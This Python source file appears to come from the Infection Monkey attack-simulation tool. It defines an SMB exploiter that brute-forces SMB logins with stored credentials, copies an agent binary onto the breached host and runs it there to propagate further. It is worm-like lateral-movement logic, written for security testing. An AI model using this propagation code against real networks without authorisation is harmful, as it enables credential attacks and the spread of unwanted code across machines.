import logging
from typing import Optional, Sequence

from common.credentials import Credentials
from common.types import Event
from infection_monkey.exploit import IAgentBinaryRepository
from infection_monkey.exploit.tools import generate_brute_force_credentials
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository
from infection_monkey.utils.threading import interruptible_iter

from .smb_exploit_client import SMBExploitClient
from .smb_options import SMBOptions
from .smb_propagation_client import SMBPropagationClient

logger = logging.getLogger(__name__)


class SMBExploiter:
    def __init__(
        self,
        exploit_client: SMBExploitClient,
        propagation_client: SMBPropagationClient,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        agent_binary_repository: IAgentBinaryRepository,
    ):
        self._exploit_client = exploit_client
        self._propagation_client = propagation_client
        self._propagation_credentials_repository = propagation_credentials_repository
        self._agent_binary_repository = agent_binary_repository

    def exploit_host(
        self,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: SMBOptions,
        interrupt: Event,
    ) -> ExploiterResultData:
        if interrupt.is_set():
            return ExploiterResultData()

        try:
            credentials = self._exploit(host, options, interrupt)
        except Exception as err:
            logger.exception(f"Failed to exploit {host}: {err}")
            return ExploiterResultData()
        if not credentials:
            return ExploiterResultData()

        try:
            propagated = self._propagate(
                host, options, credentials, servers, current_depth, interrupt
            )
            return ExploiterResultData(exploitation_success=True, propagation_success=propagated)
        except Exception as err:
            logger.exception(f"Failed to propagate to {host}: {err}")
            return ExploiterResultData(exploitation_success=True)

    def _exploit(
        self, host: TargetHost, options: SMBOptions, interrupt: Event
    ) -> Optional[Credentials]:
        credentials = self._propagation_credentials_repository.get_credentials()
        credentials_list = generate_brute_force_credentials(credentials)

        for brute_force_credentials in interruptible_iter(credentials_list, interrupt):
            if self._exploit_client.authenticate(host, options, brute_force_credentials):
                return brute_force_credentials

        return None

    def _propagate(
        self,
        host: TargetHost,
        options: SMBOptions,
        credentials: Credentials,
        servers: Sequence[str],
        current_depth: int,
        interrupt: Event,
    ) -> bool:
        destination_path = get_agent_dst_path(host)
        agent_binary = self._agent_binary_repository.get_agent_binary(host.operating_system)
        remote_path = self._propagation_client.copy_file(
            agent_binary, host, destination_path, credentials, options
        )
        if not remote_path:
            logger.debug(f"Failed to copy agent to {host}")
            return False

        if not self._propagation_client.run_agent(
            host, remote_path, destination_path, servers, current_depth, credentials, options
        ):
            logger.debug(f"Failed to run agent on {host}")
            return False

        return True
